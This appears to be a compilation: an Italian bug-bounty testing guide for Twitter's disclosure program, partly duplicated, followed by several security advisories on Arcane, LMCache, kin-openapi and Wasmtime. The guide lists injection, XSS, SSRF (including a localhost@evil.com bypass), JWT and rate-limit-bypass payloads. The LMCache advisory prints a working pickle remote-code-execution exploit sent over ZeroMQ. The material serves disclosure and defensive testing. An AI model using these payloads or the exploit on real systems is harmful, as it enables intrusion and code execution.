titolo: twitter Vulnerability Disclosure Program
descrizione: twitter public bug bounty program

scope: App mobile su Google Play / App Store
outOfScope: Attacchi DDoS / volumetrici
Social engineering su dipendenti
Test su ambienti di produzione con dati reali di utenti
Spam o invio massivo di contenuti
Vulnerabilità in browser di terze parti (es. Chrome bugs)
Rate limiting issues senza impatto reale
Self-XSS (richiede azione della vittima)
Vulnerabilità che richiedono accesso fisico al device
Clickjacking su pagine senza azioni sensibili
Best practice senza impatto dimostrabile
Username/email enumeration su form pubblici
CSRF su endpoint non state-changing
Vulnerabilità già note pubblicamente senza PoC aggiuntivo
Problemi di SPF/DKIM/DMARC
Mixed content warnings su pagine non autenticabili

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su twitter
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

testingTechniques.name: API Endpoint Discovery
testingTechniques.description: Mappa tutti gli endpoint API, parametri e metodi accettati
steps: Intercetta traffico con Burp Suite o OWASP ZAP
Usa kiterunner o wordlists API comuni
Testa metodi HTTP alternativi: PUT, DELETE, PATCH, OPTIONS
Verifica GraphQL introspection se presente
Leggi documentazione API pubblica su /docs, /swagger

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

titolo: GHSA-pw5q-rjx4-7f7p: Arcane: Delegated users:update permission allows admin account takeover via password reset (no privilege-hierarchy check)
descrizione:
## Summary
A user holding the delegated `users:update` permission can reset the global administrator's password and take over the admin account. `UpdateUser` sets the target user's `PasswordHash` from the request body for ANY target with no comparison of caller-vs-target privilege. Because role assignment and role CRUD are deliberately gated by `RequireGlobalAdmin`, `users:update` is intended to sit BELOW admin (profile management); this finding defeats that separation.

## Root Cause
`UpdateUser` (handler `backend/api/handlers/users.go:317-323`) loads the target by ID and sets `userModel.PasswordHash` from the request body for any user, then `userService.UpdateUser` (`user_service.go:174`) simply `tx.Save`s — with NO actor-vs-target privilege comparison. The only `IsGlobalAdmin` guard (`user_service.go:345`) is a last-admin check inside `DeleteUser`, not the update path. Role assignment / role CRUD are `RequireGlobalAdmin` (`backend/pkg/authz/permissions.go:27-33`), proving `users:update` is intended below admin.

## Impact
Complete administrator account takeover (C:H/I:H/A:H) by any holder of the delegated `users:update` permission.

## Proof of Concept
1. Admin delegates a custom "User Manager" role with `users:update`.
2. `PUT /users/{adminId}` with `{"password":"attacker123"}`.
3. `POST /auth/login {"username":"arcane","password":"attacker123"}` → admin session.

## Attack Chain
1. Action: admin delegates custom role with `users:update`. Guard: role creation is `RequireGlobalAdmin`. Bypass: intended delegation (holder is meant to manage profiles, not seize admin).
2. Action: `PUT /users/{adminId}` `{"password":"attacker123"}`. Guard: `RequirePermission(users:update)` (`users.go:154`). Bypass: holder has it; no hierarchy check (`users.go:317-323`, `user_service.go:174` unconditional Save).
3. Action: `POST /auth/login` as admin → admin session.

## Bypass Evidence
- `users.go:317-323` sets `PasswordHash` for any target; `user_service.go:174-194` has no actor/target privilege comparison.
- Only `IsGlobalAdmin` hits are `DeleteUser`'s last-admin guard and DTO flags (grep).
- `users:update` is org-level, held by no built-in non-admin role (`permissions.go:24`).

## Affected Versions
`<= 2.5.0`.

Reported by **zx (Jace)** — GitHub: @manus-use

titolo: GHSA-mp22-58ff-6fhr: Arcane: Environment access token bypasses the admin-required authorization gate on `/api/debug/pprof`
descrizione:
## Summary

Arcane v2.10.2 contains an authorization inconsistency in `AuthMiddleware.managerAuth`.

When a request supplies a valid environment access token through the `X-Arcane-Agent-Token` header, `managerAuth` resolves the associated environment, installs an environment-scoped permission set, and immediately calls `next(c)`.

This occurs before the middleware evaluates the `AdminRequired` option and verifies that the caller is a global administrator.

As a result, an environment-scoped access token can access routes protected with `WithAdminRequired()`, despite the corresponding `EnvironmentPermissionSet` intentionally containing no global or sudo permissions.

In v2.10.2, the affected admin-only surface is the manager's Go `pprof` diagnostic interface under:

`/api/debug/pprof/*`

This exposes diagnostic and runtime profiling information that the application explicitly intends to restrict to global administrators.

The issue is an incorrect authorization vulnerability (CWE-863).

## Details

### 1. Environment access tokens are accepted by the manager authentication middleware

The production authentication middleware is configured with an environment access-token resolver:

`backend/internal/di/providers.go`

Conceptually, the middleware is constructed as:

```go
auth.NewAuthMiddleware(authService, cfg).
    WithApiKeyValidator(apiKey).
    WithEnvironmentAccessTokenResolver(env).
    WithPermissionResolver(role)
```

Therefore, the `X-Arcane-Agent-Token` authentication path is active in the production manager.

### 2. The environment-token path returns before authorization options are evaluated

The relevant logic is in:

`backend/internal/auth/middleware.go`

`managerAuth` first checks the `X-Arcane-Agent-Token` header.

When the token resolves to an environment, the middleware installs an environment-scoped permission set and immediately continues processing:

```go
if agentToken := req.Header.Get(utils.HeaderAgentToken); agentToken != "" {
    if env, ok := m.resolveEnvironmentAccessToken(ctx, agentToken).Get(); ok {
        environmentScopedInternal(c, env)
        return next(c)
    }
}
```

The important part is the unconditional:

```go
return next(c)
```

The normal authentication path later evaluates the middleware's `AdminRequired` option:

```go
ps := m.resolvePermissionsOrDeny(ctx, user)

if m.options.AdminRequired && !ps.IsGlobalAdmin() {
    return c.JSON(http.StatusForbidden, common.APIError{
        Code:    "FORBIDDEN",
        Message: "You don't have permission to access this resource",
    })
}
```

The environment-token branch never reaches this check.

Consequently, `WithAdminRequired()` has no effect when authentication succeeds through a valid environment access token.

This creates an authorization inconsistency between authentication mechanisms:

- normal user/session authentication → `AdminRequired` is enforced;
    
- environment access-token authentication → `AdminRequired` is bypassed.
    

### 3. Environment tokens are intentionally not global-administrator credentials

`backend/pkg/authz/permission_set.go` defines the effective permissions assigned to an environment access token.

`EnvironmentPermissionSet(envID)` grants environment-scoped permissions only for the specified environment:

```go
func EnvironmentPermissionSet(envID string) *PermissionSet {
    ps := NewPermissionSet()

    if envID == "" {
        return ps
    }

    for _, p := range AllPermissions() {
        if IsEnvScoped(p) {
            ps.AddEnv(envID, p)
        }
    }

    return ps
}
```

The implementation explicitly establishes that these credentials do not receive global or sudo permissions.

Therefore, an environment access token should not satisfy a global-administrator authorization requirement.

The early return in `managerAuth` bypasses this intended privilege boundary.

### 4. `/api/debug/pprof/*` explicitly requires global-administrator authorization

The diagnostic routes are registered in:

`backend/api/ws/diagnostics.go`

The `pprof` group is protected using:

```go
pprofGroup := group.Group(
    "/debug/pprof",
    authMiddleware.WithAdminRequired().Add(),
)
```

The source also documents the intended authorization requirement by noting that pprof keeps the stricter admin-required gate.

The group exposes handlers including:

```text
/api/debug/pprof/
/api/debug/pprof/cmdline
/api/debug/pprof/profile
/api/debug/pprof/symbol
/api/debug/pprof/trace
/api/debug/pprof/heap
/api/debug/pprof/goroutine
/api/debug/pprof/allocs
/api/debug/pprof/block
/api/debug/pprof/mutex
/api/debug/pprof/threadcreate
```

Named profiles are dispatched through `pprof.Handler`.

Because `WithAdminRequired()` is bypassed by the environment-token branch, a valid environment access token can reach these handlers even though its permission set is not globally privileged.

### 5. Other middleware does not restore the missing authorization check

The CSRF middleware recognizes `X-Arcane-Agent-Token` as a header-based credential and does not apply the normal cross-origin CSRF validation to such requests.

Additionally, the environment proxy middleware passes through requests that do not target an `/environments/{id}/...` path.

Therefore a request to:

```text
/api/debug/pprof/*
```

can proceed to `managerAuth`, enter the environment-token authentication branch, and reach the pprof handler without another global-administrator authorization check being applied.

## Source-to-sink authorization path

The vulnerable control flow is:

```text
X-Arcane-Agent-Token
        |
        v
environment access token resolver
        |
        v
environment resolved successfully
        |
        v
EnvironmentPermissionSet(environmentID)
        |
        v
return next(c)
        |
        |  AdminRequired check is skipped
        v
/api/debug/pprof/*
        |
        v
net/http/pprof handler
```

The security boundary violation occurs at the early `return next(c)`.

## Proof of Concept

### Preconditions

The test requires:

1. A valid Arcane environment access token.
    
2. An Arcane manager running the affected code.
    
3. No global-administrator account or credentials.
    

### Test 1 — environment access token

Send a request to an admin-protected pprof endpoint using only an environment access token:

```http
GET /api/debug/pprof/heap?debug=1 HTTP/1.1
Host: arcane.example.com
X-Arcane-Agent-Token: <VALID_ENVIRONMENT_ACCESS_TOKEN>
```

No administrator session cookie or administrator Bearer token is supplied.

### Vulnerable behavior

On an affected instance, the request is expected to reach the pprof handler instead of being rejected by `WithAdminRequired()`.

A successful response demonstrates that the environment-token authentication branch bypasses the administrator requirement.

For example, the response may contain the Go heap profiling output generated by `net/http/pprof`.

### Test 2 — non-admin user contrast case

Send the same request using a normal authenticated non-global-admin user:

```http
GET /api/debug/pprof/heap?debug=1 HTTP/1.1
Host: arcane.example.com
Authorization: Bearer <NON_ADMIN_ACCESS_TOKEN>
```

The expected result is:

```http
HTTP/1.1 403 Forbidden
```

with an authorization error indicating that the user does not have permission to access the resource.

This contrast demonstrates the authorization inconsistency:

```text
environment-scoped token
        -> admin gate skipped
        -> pprof handler reached

normal non-admin user
        -> admin gate evaluated
        -> HTTP 403
```

### Expected secure behavior

A valid environment access token should receive:

```http
HTTP/1.1 403 Forbidden
```

for every route protected with `WithAdminRequired()`.

Only a caller whose effective permission set satisfies `IsGlobalAdmin()` should be allowed to access these routes.

## Impact

An attacker who obtains a valid environment access token can cross the intended authorization boundary between an individual environment and manager-wide administrative functionality.

In the currently identified route configuration, this allows unauthorized access to the manager's Go `pprof` diagnostic endpoints.

Depending on the requested profile, these endpoints can expose internal runtime and diagnostic information such as:

- goroutine stack traces;
    
- function and package names;
    
- allocation and heap profiling information;
    
- CPU profiling information;
    
- runtime execution traces;
    
- process command-line information;
    
- mutex, block, thread and allocation profiling data.
    

This information is normally restricted to global administrators by Arcane's explicit use of `WithAdminRequired()`.

Some profiling operations may also impose additional CPU, memory, or tracing overhead while being collected.

Importantly, this report does **not** assume that Go's pprof heap endpoint is an arbitrary raw-process-memory dump. Direct extraction of session tokens, environment access tokens, passwords, or other credentials from pprof output has not been demonstrated and is therefore not claimed as part of the confirmed impact.

The confirmed security issue is the authorization bypass itself and the resulting unauthorized exposure of administrator-restricted diagnostic functionality.

## Root Cause

The root cause is that authentication through an environment access token takes an early-success path:

```go
environmentScopedInternal(c, env)
return next(c)
```

before common middleware authorization options are evaluated.

As a result, authorization requirements configured on the middleware are dependent on which authentication mechanism is used.

Authentication establishes the identity and scope of the caller, but route-level authorization requirements such as `AdminRequired` should subsequently be applied consistently regardless of the authentication mechanism.

## Remediation

The environment-token authentication path should not call `next(c)` before the configured authorization requirements have been evaluated.

One approach is to resolve the environment token into its `EnvironmentPermissionSet` and then pass that permission set through the same authorization-option evaluation used by other authentication mechanisms.

For example, logically:

```go
if envTokenIsValid {
    ps := authz.EnvironmentPermissionSet(env.ID)

    if m.options.AdminRequired && !ps.IsGlobalAdmin() {
        return forbidden
    }

    environmentScopedInternal(c, env)
    return next(c)
}
```

Because an `EnvironmentPermissionSet` intentionally has no global permissions, an environment token would then correctly receive HTTP 403 for `WithAdminRequired()` routes.

As additional defense in depth, the pprof endpoints could explicitly reject environment access tokens and other environment-scoped authentication mechanisms, allowing access only through authentication mechanisms capable of representing a global administrator.

It may also be worth considering whether pprof should be exposed in production by default or enabled only through an explicit diagnostic configuration option.

## Regression Tests

The following cases should be covered:

```text
Valid environment access token
+ /api/debug/pprof/heap
=> 403

Normal authenticated non-admin user
+ /api/debug/pprof/hea
=> 403

Unauthenticated request
+ /api/debug/pprof/heap
=> 401/403

Global administrator
+ /api/debug/pprof/heap
=> 200
```

More generally, tests should verify that every authentication mechanism is subject to middleware options such as `AdminRequired`.

The issue could also broadly be categorized as an authorization-check bypass caused by inconsistent authorization handling across authentication paths..
 

No claim of credential extraction, arbitrary process-memory disclosure, or global-administrator takeover is made unless separately demonstrated through dynamic testing.

titolo: GHSA-w5f2-9q9c-ff4h: LMCache: Remote code execution via unsafe deserialization in multiprocess mode transport
descrizione:
### Summary

LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport



### Details

LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with --host, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.

Messages on the socket are msgpack. Extension code 1 is registered for DeviceIPCWrapper and is passed to DeviceIPCWrapper.Deserialize in lmcache/v1/platform/base/ipc_wrapper.py, which calls pickle.loads. That hook runs from ext_hook in lmcache/v1/multiprocess/custom_types.py while the server is still decoding REGISTER_KV_CACHE arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.

The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published.



### Proof of concept

Step 1 - Start multiprocess mode bound to a routable address


This is the documented multi-node setting. The ZMQ transport listens on port 5555.

```
   python -m lmcache.v1.multiprocess.http_server \
    --http-host 127.0.0.1 --http-port 8080 \
    --host 0.0.0.0 --port 5555 \
    --l1-size-gb 0.25 --eviction-policy LRU \
    --hash-algorithm blake3 --instance-id mp-node-01
```
Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle


Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes id to /tmp/zmq_pwn.

```
import os
import pickle
import msgspec
import zmq

class EvilPayload:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))

REGISTER_KV_CACHE = 1
EXT_CODE = 1
NUM_PAYLOADS = 7
KVCACHE_INDEX = 1

b_uid = msgspec.msgpack.encode(0)
b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
payloads[0] = msgspec.msgpack.encode(0)
payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
)
frames = [b_uid, b_type, *payloads]
```
Step 3 - Send the frame


```
ctx = zmq.Context()
s = ctx.socket(zmq.DEALER)
s.connect("tcp://127.0.0.1:5555")
s.send_multipart(frames)
```
The pickle runs during argument decode. The server then logs a type error for REGISTER_KV_CACHE because the handler expected a DeviceIPCWrapper and received the return value of os.system. That error is after the command has already run.


Step 4 - Confirm the command ran as the LMCache user


```
cat /tmp/zmq_pwn
```
Expected output on an official image, where the process runs as root:

```
uid=0(root) gid=0(root) groups=0(root)
```

### Impact

LMCache's multiprocess (MP) mode uses a ZeroMQ transport (port 5555 by default) that does not require authentication. Device IPC descriptors received on this transport were deserialized with `pickle.loads`. An attacker who can reach the transport port can send a single crafted message and execute arbitrary code with the privileges of the LMCache process.

By default the transport binds to localhost, and single-process (in-process) mode does not open the port. Deployments are exposed when the transport binds a routable address, as multi-node setups do. The project's example Kubernetes deployment bound all interfaces, and official container images ran as root, so deployments based on them should be treated as exposed.

Affected: 0.3.9 through 0.5.5, the 0.5.6 release candidates, and `dev` branch builds before PR #5644.


### Patches

Fixed in **0.5.6**. Pickle has been replaced with versioned, typed MessagePack descriptors that are validated before use; the device wrapper type is selected from a fixed local allowlist, and there is no pickle fallback. Both the ZeroMQ and gRPC transport paths are covered.

The wire format has changed: upgrade all workers and servers together.

0.5.6 also binds the example Kubernetes deployment to localhost (PR #5684) and runs official images as a non-root user (PR #5685).

### Workarounds

Until you can upgrade:

- Do not bind the transport to a routable address; keep it on localhost or a trusted cluster network.
- Restrict access to the transport port (5555 by default) with firewall rules or network policies.
- Run LMCache as a non-root user (build from the provided Dockerfile if needed).

If the transport port was ever reachable from an untrusted network, treat the host as potentially compromised: review connections to the port, check for unexpected processes or outbound connections from the LMCache process, rotate reachable credentials, and redeploy from clean images.

titolo: GHSA-74vm-87hj-r66f: kin-openapi openapi3filter: nil-pointer panic in ValidateResponse on a response header declared with content
descrizione:
## Summary

`ValidateResponse` panics on a nil pointer when a spec declares a response header with `content` instead of `schema`. `doc.Validate()` accepts that document, so the crash comes from a spec the library just called valid.

Same class as GHSA-jpcw-4wr7-c3vq, which covered the request-parameter case in v0.144.0; this is the response-header path.

Affects `github.com/getkin/kin-openapi` `<= v0.145.0`. Reproduced on master `947498e5a6bd`, Go 1.26.

## Details

A `content`-typed response header has `headerRef.Value.Schema == nil`.

`validate_response.go:181` passes it straight through:

```go
if decodedValue, found, err = decodeValue(dec, headerName, sm, headerRef.Value.Schema, headerRef.Value.Required); err != nil {
```

and `req_resp_decoder.go:273` is where it lands:

```go
if len(schema.Value.AllOf) > 0 {
```

Two things I checked rather than assumed. The response does not need to carry the header; declaring it is enough, and then every call for that operation panics. And the body path is fine, `:114` returns early on a nil schema, so this is headers only. The PoC keeps the body case as a control.

## PoC

Drop into `openapi3filter/` and run:

```
go test ./openapi3filter/ -run NilSchema -v
```

```go
package openapi3filter_test

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers"
)

const specBody = `
openapi: 3.0.3
info: {title: poc, version: "1.0.0"}
paths:
  /x:
    get:
      responses:
        "200":
          description: ok
          content:
            application/json: {}
`

const specHeader = `
openapi: 3.0.3
info: {title: poc, version: "1.0.0"}
paths:
  /x:
    get:
      responses:
        "200":
          description: ok
          headers:
            X-Thing:
              content:
                application/json: {}
`

func validatedInput(t *testing.T, spec string, hdr http.Header) *openapi3filter.ResponseValidationInput {
	t.Helper()
	doc, err := openapi3.NewLoader().LoadFromData([]byte(spec))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(context.Background()); err != nil {
		t.Fatalf("doc.Validate rejected the spec, so this repro proves nothing: %v", err)
	}
	op := doc.Paths.Find("/x").Get
	req := httptest.NewRequest(http.MethodGet, "/x", nil)
	return &openapi3filter.ResponseValidationInput{
		RequestValidationInput: &openapi3filter.RequestValidationInput{
			Request: req,
			Route:   &routers.Route{Spec: doc, Operation: op, Method: http.MethodGet, Path: "/x"},
		},
		Status: 200,
		Header: hdr,
		Body:   io.NopCloser(strings.NewReader(`{}`)),
	}
}

// Control: body path returns early on a nil schema.
func TestControl_ResponseBodyNilSchema(t *testing.T) {
	in := validatedInput(t, specBody, http.Header{"Content-Type": {"application/json"}})
	defer func() {
		if r := recover(); r != nil {
			t.Errorf("body path panicked, expected clean return: %v", r)
		}
	}()
	if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
		t.Errorf("body path returned %v, expected nil", err)
	}
}

// The response does not carry X-Thing. Declaring the header is enough.
func TestResponseHeaderNilSchema(t *testing.T) {
	in := validatedInput(t, specHeader, http.Header{"Content-Type": {"application/json"}})
	if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
		t.Fatalf("no panic; got err = %v (already fixed?)", err)
	}
}
```

Output:

```
=== RUN   TestControl_ResponseBodyNilSchema
--- PASS: TestControl_ResponseBodyNilSchema (0.00s)
=== RUN   TestResponseHeaderNilSchema
--- FAIL: TestResponseHeaderNilSchema (0.00s)
panic: runtime error: invalid memory address or nil pointer dereference [recovered, repanicked]
[signal SIGSEGV: segmentation violation code=0x1 addr=0x20 pc=0x7f6d2a]

github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
	/src/openapi3filter/req_resp_decoder.go:273 +0x4a
github.com/getkin/kin-openapi/openapi3filter.validateResponseHeader(...)
	/src/openapi3filter/validate_response.go:181 +0x146
github.com/getkin/kin-openapi/openapi3filter.ValidateResponse(...)
	/src/openapi3filter/validate_response.go:89 +0xafa
```

The `FAIL` is the point: control passes, the header case takes the binary down.

Ran in a container against a fresh clone of master. I have not tried it against a live proxy.

## Impact

A process crash instead of an error return. Declaring the header is enough, so it is every call on that operation rather than an occasional one.

If the spec comes from somewhere else -- gateways, linters, anything ingesting specs it did not write -- that is a trust boundary, and it becomes remote availability.

If it is your own spec, nothing attacker-controlled starts it, but any client reaching that route then crashes the process. It fires on every call, so normally you would see it the first time that route runs. A spec edited without exercising the route is the case where you would not. That is the difference from GHSA-jpcw, where the attacker supplied the trigger. I have left severity unset; the two cases do not score the same.

On how common it is, I checked rather than guessed. Of roughly 1,500 OpenAPI 3.x specs on apis.guru, one declares content-typed response headers -- VTEX Catalog API -- and not in one corner of it: the shape repeats across its operations, so for that consumer this is not an edge case.

The header names in it (`X-AspNet-Version`, `p3p`, a few malformed ones) look like a generator emitting `content` where it could not infer a schema, and apis.guru only indexes public specs. There is no content-typed response header in this repo's testdata either.

## Workarounds

Use `schema` on the response header, or skip `ValidateResponse` for those operations. `ExcludeResponseBody` will not do it -- headers are validated before that check.

## Suggested fix

Nil-guard at the top of `decodeValue`:

```go
if schema == nil {
	return nil, false, nil
}
```

Returning nil leaves a `content`-typed header unvalidated rather than erroring, so it trades the crash for a silent gap. An error return kills the panic just as well if you would rather it surfaced.

titolo: GHSA-4ch3-9j33-3pmj: Wasmtime: WASI hard links bypass wasmtime-wasi's FilePerms for destination
descrizione:
## Summary

Wasmtime's WASI filesystem implementation lets a guest with a read-only source file capability overwrite that file by hard-linking it into another preopen that allows file writes. An attacker who can run a WASI guest can bypass `WasiCtxBuilder` per-preopen `FilePerms` and modify host files that were exposed as `FilePerms::READ`.

This attack is possible through the wasip1, wasip2, and wasip3 interfaces to the WASI filesystem.

This attack is also possible through an indirection of renaming a hardlink into another preopen.

### Details

`WasiCtxBuilder::preopened_dir` documents `file_perms` as the maximum permissions usable for files in that preopen. However, hard-link creation and renaming only checked directory mutation for permission, and not whether the file permissions matched.

This makes an attack possible where:
* a read-only file `target` exists in a preopen with only FilePerms::READ
* a hardlink named `alias`, with destination to the `target`, is created in a preopen with FilePerms::READ | FilePerms::WRITE
* the attacker opens the file `alias` for writing, in which they can overwrite `target`

The same attack is possible by way of renaming:
* a read-only file `target` exists in a preopen with only FilePerms::READ
* a hardlink named `alias`, with destination to the `target`, is created in that same preopen
* the `alias` file is renamed into a preopen with FilePerms::READ | FilePerms::WRITE
* the attacker opens the file `alias` for writing, in which they can overwrite `target`

Symbolic links are not a vector for this attack because the wasi-filesystem interfaces already enforces that the destination for a symlink is under the same preopen. We do not believe there are any other vectors to this attack because there are no other wasi filesystem interfaces that take multiple borrows of a descriptor resource for e.g. the source and destination in different descriptors.

### Remediation

The definition of `Dir::link_at` and `Dir::rename_at` in wasmtime-wasi's `src/filesystem.rs` now have an additional permissions check that ensures the source and destination values for the directory permissions `perms` and the file permissions `file_perms` are identical.

```rust
        if self.perms != new_dir.perms || self.file_perms != new_dir.file_perms {
            return Err(ErrorCode::NotPermitted);
        }
```

### Impact

